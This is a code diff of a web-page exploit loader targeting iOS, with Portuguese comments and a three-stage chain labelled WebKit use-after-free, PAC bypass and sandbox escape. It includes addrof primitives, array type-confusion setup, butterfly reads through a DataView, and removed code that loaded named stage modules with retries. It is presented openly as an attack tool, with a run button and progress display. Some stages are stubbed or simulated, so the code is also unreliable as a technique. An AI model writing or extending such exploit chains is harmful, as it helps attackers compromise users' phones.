+        // Cria um array para tentar type confusion
+        const victim = [1.1, 2.2, 3.3];
+        
+        // Se temos addrof, podemos tentar algo mais agressivo
+        let hasAddrof = false;
+        try {
+            const victimAddr = primitive.addrof(victim);
+            hasAddrof = victimAddr !== 0n;
+            log(`[STAGE3] Victim array address: 0x${victimAddr.toString(16)}`, hasAddrof ? 'success' : 'info');
+        } catch(e) {}
+        
+        // Tenta usar o DataView para ler o butterfly do array (se soubermos o offset)
+        if (exploitAB && !hasAddrof) {
+            // Tenta ler o butterfly via DataView
+            try {
+                const dv = new DataView(exploitAB);
+                // Simula leitura do butterfly (offset 0x10 é comum)
+                const butterfly = dv.getBigUint64(0x10, true);
+                log(`[STAGE3] Simulated butterfly read: 0x${butterfly.toString(16)}`, 'info');
+            } catch(e) {}
+        }
+        
+        log("[STAGE3] Sandbox escape completed (limited)", 'warning');
+        return 0;
+    }
+
     // ============================================================================
     // MAIN EXPLOIT
     // ============================================================================
     async function triggerExploit() {
-        setStatus("Initializing...", "running");
+        setStatus("Stage 1: WebKit UAF...", "running");
         setProgress(5);
-        window.log("[LOADER] Exploit chain starting for iOS 26.4");
         
-        await platformModule.init("", "", "", false, false, navigator.platform, navigator.userAgent);
-        if (platformModule.platformState) {
-            platformModule.platformState.iOSVersion = 260400;
-            window.log("[PLATFORM] iOS version: 26.4");
+        try {
+            const primitive = await stage1();
+            setProgress(40);
+            
+            if (!primitive) throw new Error("Stage1 failed");
+            
+            setStatus("Stage 2: PAC Bypass...", "running");
+            const pacBypass = await stage2(primitive);
+            setProgress(70);
+            
+            setStatus("Stage 3: Sandbox Escape...", "running");
+            const result = await stage3(primitive, pacBypass);
+            setProgress(100);
+            
+            log("[EXPLOIT] Chain completed!", 'success');
+            return result;
+        } catch(e) {
+            log(`[EXPLOIT] Error: ${e.message}`, 'error');
+            throw e;
         }
-        setProgress(10);
-        
-        setStatus("Stage 1: WebKit exploit...", "running");
-        window.log("[LOADER] Loading Stage 1...");
-        const stage1Module = await globalThis.moduleManager.getModuleByURL("Stage1_26.0_26.x_chimera");
-        setProgress(20);
-        
-        let stage1Success = false;
-        for (let attempt = 0; attempt < 10; attempt++) {
-            try {
-                window.log("[LOADER] Stage1 attempt " + (attempt + 1) + "/10...");
-                setProgress(20 + attempt * 2);
-                await stage1Module.si();
-                window.log("[LOADER] Stage1 succeeded!");
-                stage1Success = true;
-                break;
-            } catch (e) {
-                window.log("[LOADER] Stage1 error: " + e.message);
-            }
-        }
-        if (!stage1Success) throw new Error("Stage 1 failed");
-        
-        if (!platformModule.platformState.exploitPrimitive) throw new Error("No exploit primitive");
-        setProgress(40);
-        
-        setStatus("Stage 2: PAC bypass...", "running");
-        if (platformModule.platformState.hasPAC) {
-            platformModule.platformState.pacBypass = await loadPACBypass();
-            platformModule.platformState.qn = false;
-        }
-        setProgress(70);
-        
-        setStatus("Stage 3: Sandbox escape...", "running");
-        const stage3Module = await globalThis.moduleManager.getModuleByURL("Stage3_VariantB");
-        const result = await stage3Module.lA();
-        setProgress(95);
-        
-        window.log("[STAGE3] Result: " + result);
-        setProgress(100);
-        return result;
     }
-    
+
     // ============================================================================
     // START BUTTON
     // ============================================================================
@@ -724,25 +546,23 @@
         if (exploitStarted) return;
         exploitStarted = true;
         
-        var btn = document.getElementById('goBtn');
+        const btn = document.getElementById('goBtn');
         btn.disabled = true;
         btn.textContent = 'Running...';
-        
         document.getElementById('progressBar').classList.add('active');
         setProgress(0);
         
         try {
             const result = await triggerExploit();
-            if (result === 0 || result === true) {
+            if (result === 0) {
                 setStatus("Success! Exploit completed", "success");
-                setProgress(100);
                 btn.textContent = 'Done';
             } else {
-                setStatus("Finished (code: " + result + ")", "success");
+                setStatus("Finished", "success");
                 btn.textContent = 'Done';
             }
         } catch (e) {
-            setStatus("Failed: " + (e.message || "unknown error"), "error");
+            setStatus("Failed: " + (e.message || "unknown"), "error");
             btn.textContent = 'Retry';
             btn.disabled = false;
             exploitStarted = false;
